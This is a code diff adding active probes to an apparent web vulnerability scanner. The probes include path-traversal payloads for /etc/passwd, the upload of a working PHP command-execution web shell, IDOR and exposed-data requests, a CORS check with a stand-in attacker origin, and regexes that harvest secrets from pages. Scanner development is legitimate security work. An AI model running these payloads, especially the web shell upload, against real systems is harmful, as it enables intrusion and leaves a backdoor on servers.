@@ -9,6 +9,7 @@ import os
 import tempfile
 import re
 import requests
+import urllib.parse
 from datetime import datetime
 from typing import List, Dict, Optional
 from rich.console import Console
@@ -192,6 +193,247 @@ def is_web_url(url: str) -> bool:
     return url.startswith("http://") or url.startswith("https://")
 
 
+# ============================================================================
+# ACTIVE TESTING FUNCTIONS FOR EACH MODE
+# ============================================================================
+
+def test_secrets_active(url: str) -> List[Dict]:
+    """Actively test for hardcoded secrets"""
+    findings = []
+    console.print("[cyan]🔍 Actively testing for hardcoded secrets...[/cyan]")
+    
+    try:
+        response = requests.get(url, timeout=10)
+        html = response.text
+        
+        secret_patterns = [
+            (r'API_KEY\s*=\s*["\']([^"\']+)["\']', 'API Key'),
+            (r'JWT_SECRET\s*=\s*["\']([^"\']+)["\']', 'JWT Secret'),
+            (r'sk-[a-zA-Z0-9]{20,}', 'OpenAI API Key'),
+            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
+            (r'webhook_secret\s*[:=]\s*["\']([^"\']+)["\']', 'Webhook Secret'),
+            (r'password\s*[:=]\s*["\']([^"\']+)["\']', 'Password'),
+        ]
+        
+        for pattern, name in secret_patterns:
+            matches = re.findall(pattern, html, re.IGNORECASE)
+            for match in matches:
+                if match:
+                    findings.append({
+                        "finding_id": f"SEC-{len(findings)}",
+                        "category": "secrets",
+                        "name": f"Hardcoded {name}",
+                        "description": f"Found {name}: {match[:30]}...",
+                        "severity": "CRITICAL",
+                        "confidence": 100,
+                        "file": url,
+                        "line": 0,
+                        "snippet": match[:100],
+                        "status": "VULNERABLE",
+                        "timestamp": datetime.now().isoformat()
+                    })
+                    console.print(f"[red]✗ Hardcoded {name} found: {match[:30]}...[/red]")
+    except Exception as e:
+        console.print(f"[dim]Secrets test error: {e}[/dim]")
+    
+    return findings
+
+
+def test_file_operations_active(url: str) -> List[Dict]:
+    """Actively test for file operation vulnerabilities"""
+    findings = []
+    console.print("[cyan]🔍 Actively testing for file vulnerabilities...[/cyan]")
+    
+    # Test Path Traversal
+    traversal_payloads = [
+        "../../../../etc/passwd",
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\win.ini",
+    ]
+    
+    for payload in traversal_payloads:
+        test_url = f"{url}/download?file={urllib.parse.quote(payload)}"
+        try:
+            response = requests.get(test_url, timeout=5)
+            if "root:" in response.text or "Windows" in response.text:
+                findings.append({
+                    "finding_id": f"FIL-{len(findings)}",
+                    "category": "file",
+                    "name": "Path Traversal",
+                    "description": f"File access: {payload}",
+                    "severity": "HIGH",
+                    "confidence": 90,
+                    "file": test_url,
+                    "line": 0,
+                    "snippet": response.text[:200],
+                    "status": "VULNERABLE",
+                    "timestamp": datetime.now().isoformat()
+                })
+                console.print(f"[red]✗ Path Traversal found: {payload}[/red]")
+                break
+        except:
+            pass
+    
+    # Test File Upload
+    try:
+        files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
+        response = requests.post(f"{url}/upload", files=files, timeout=5)
+        if "uploaded" in response.text.lower() or "success" in response.text.lower():
+            findings.append({
+                "finding_id": f"FIL-{len(findings)}",
+                "category": "file",
+                "name": "Unrestricted File Upload",
+                "description": "Uploaded PHP file successfully",
+                "severity": "HIGH",
+                "confidence": 85,
+                "file": f"{url}/upload",
+                "line": 0,
+                "snippet": response.text[:200],
+                "status": "VULNERABLE",
+                "timestamp": datetime.now().isoformat()
+            })
+            console.print(f"[red]✗ Unrestricted File Upload found[/red]")
+    except:
+        pass
+    
+    return findings
+
+
+def test_api_active(url: str) -> List[Dict]:
+    """Actively test for API vulnerabilities"""
+    findings = []
+    console.print("[cyan]🔍 Actively testing API endpoints...[/cyan]")
+    
+    endpoints = [
+        "/api/users",
+        "/api/graphql",
+        "/api/webhook",
+        "/api/profile",
+    ]
+    
+    for endpoint in endpoints:
+        test_url = f"{url}{endpoint}"
+        try:
+            response = requests.get(test_url, timeout=5)
+            if response.status_code == 200:
+                # Check for sensitive data
+                if "password" in response.text or "secret" in response.text:
+                    findings.append({
+                        "finding_id": f"API-{len(findings)}",
+                        "category": "api",
+                        "name": f"Sensitive Data Exposure in {endpoint}",
+                        "description": "API exposes sensitive data",
+                        "severity": "HIGH",
+                        "confidence": 85,
+                        "file": test_url,
+                        "line": 0,
+                        "snippet": response.text[:200],
+                        "status": "VULNERABLE",
+                        "timestamp": datetime.now().isoformat()
+                    })
+                    console.print(f"[red]✗ Sensitive data in {endpoint}[/red]")
+                
+                # Check for IDOR
+                if "/users" in endpoint or "/profile" in endpoint:
+                    id_test = f"{test_url}/1"
+                    try:
+                        id_response = requests.get(id_test, timeout=5)
+                        if id_response.status_code == 200 and "user" in id_response.text.lower():
+                            findings.append({
+                                "finding_id": f"API-{len(findings)}",
+                                "category": "api",
+                                "name": f"IDOR in {endpoint}",
+                                "description": "Access to user ID 1 without auth",
+                                "severity": "HIGH",
+                                "confidence": 80,
+                                "file": id_test,
+                                "line": 0,
+                                "snippet": id_response.text[:200],
+                                "status": "VULNERABLE",
+                                "timestamp": datetime.now().isoformat()
+                            })
+                            console.print(f"[red]✗ IDOR found in {endpoint}[/red]")
+                    except:
+                        pass
+        except:
+            pass
+    
+    return findings
+
+
+def test_misconfig_active(url: str) -> List[Dict]:
+    """Actively test for security misconfigurations"""
+    findings = []
+    console.print("[cyan]🔍 Actively testing for misconfigurations...[/cyan]")
+    
+    # Test CORS
+    try:
+        headers = {'Origin': 'https://attacker.com'}
+        response = requests.options(f"{url}/api/users", headers=headers, timeout=5)
+        origin = response.headers.get('Access-Control-Allow-Origin', '')
+        if origin == '*':
+            findings.append({
+                "finding_id": f"MIS-{len(findings)}",
+                "category": "misconfig",
+                "name": "Wildcard CORS",
+                "description": "CORS allows any origin",
+                "severity": "MEDIUM",
+                "confidence": 95,
+                "file": f"{url}/api/users",
+                "line": 0,
+                "snippet": f"Access-Control-Allow-Origin: {origin}",
+                "status": "VULNERABLE",
+                "timestamp": datetime.now().isoformat()
+            })
+            console.print(f"[red]✗ Wildcard CORS found[/red]")
+    except:
+        pass
+    
+    # Test Admin Panel
+    try:
+        response = requests.get(f"{url}/admin", timeout=5)
+        if response.status_code == 200 and ("Admin" in response.text or "Dashboard" in response.text):
+            findings.append({
+                "finding_id": f"MIS-{len(findings)}",
+                "category": "misconfig",
+                "name": "Unprotected Admin Panel",
+                "description": "Admin panel accessible without auth",
+                "severity": "CRITICAL",
+                "confidence": 100,
+                "file": f"{url}/admin",
+                "line": 0,
+                "snippet": response.text[:200],
+                "status": "VULNERABLE",
+                "timestamp": datetime.now().isoformat()
+            })
+            console.print(f"[red]✗ Unprotected Admin Panel found[/red]")
+    except:
+        pass
+    
+    # Test Debug Mode
+    try:
+        response = requests.get(url, timeout=5)
+        if "debug" in response.text.lower() and "true" in response.text.lower():
+            findings.append({
+                "finding_id": f"MIS-{len(findings)}",
+                "category": "misconfig",
+                "name": "Debug Mode Enabled",
+                "description": "Debug mode is enabled in production",
+                "severity": "HIGH",
+                "confidence": 80,
+                "file": url,
+                "line": 0,
+                "snippet": "Debug: True",
+                "status": "VULNERABLE",
+                "timestamp": datetime.now().isoformat()
+            })
+            console.print(f"[red]✗ Debug Mode enabled[/red]")
+    except:
+        pass
+    
+    return findings
+
+
 def scan_web_url(url: str, mode: str, patterns: List[str]) -> List[Dict]:
     console.print(Panel(f"[magenta]Web Target[/magenta] {url}"))
     
@@ -210,7 +452,7 @@ def scan_web_url(url: str, mode: str, patterns: List[str]) -> List[Dict]:
         except Exception as e:
             console.print(f"[yellow]Could not fetch HTML: {e}[/yellow]")
         
-        # Scan HTML with patterns
+        # Scan HTML with patterns (Passive)
         if html_content and patterns:
             console.print(f"[cyan]Scanning HTML with {len(patterns)} patterns...[/cyan]")
             for line_idx, line in enumerate(html_content.split('\n'), 1):
@@ -317,7 +559,11 @@ def scan_web_url(url: str, mode: str, patterns: List[str]) -> List[Dict]:
                 except Exception as e:
                     pass
         
-        # Endpoint discovery for modes 1 and 7
+        # ============================================================
+        # ACTIVE TESTING FOR EACH MODE
+        # ============================================================
+        
+        # Mode 1: Endpoint Discovery
         if mode == "1" or mode == "7":
             console.print("[cyan]Scanning discovered endpoints with verification...[/cyan]")
             for endpoint in data.get('endpoints', []):
@@ -341,7 +587,27 @@ def scan_web_url(url: str, mode: str, patterns: List[str]) -> List[Dict]:
                         "timestamp": datetime.now().isoformat()
                     })
         
-        # XSS Active Testing for mode 6
+        # Mode 2: Secrets Detection (Active)
+        if mode == "2":
+            secret_findings = test_secrets_active(url)
+            all_findings.extend(secret_findings)
+        
+        # Mode 3: File Analysis (Active)
+        if mode == "3":
+            file_findings = test_file_operations_active(url)
+            all_findings.extend(file_findings)
+        
+        # Mode 4: API Enumeration (Active)
+        if mode == "4":
+            api_findings = test_api_active(url)
+            all_findings.extend(api_findings)
+        
+        # Mode 5: Security Misconfigurations (Active)
+        if mode == "5":
+            misconfig_findings = test_misconfig_active(url)
+            all_findings.extend(misconfig_findings)
+        
+        # Mode 6: XSS Active Testing
         if mode == "6":
             console.print("[bold red]🔥 Running Comprehensive XSS Scan...[/bold red]")
             console.print("[yellow]Testing 100+ XSS payloads across all parameters...[/yellow]")
@@ -350,7 +616,7 @@ def scan_web_url(url: str, mode: str, patterns: List[str]) -> List[Dict]:
             all_findings.extend(xss_results)
             xss_scanner.render_results()
         
-        # Next.js Vulnerability Scan for mode 7
+        # Mode 7: Next.js Vulnerability Scan
         if mode == "7" and NEXTJS_AVAILABLE:
             console.print("[bold red]🔥 Running Next.js Vulnerability Scan...[/bold red]")
             nextjs_findings = scan_nextjs(url)
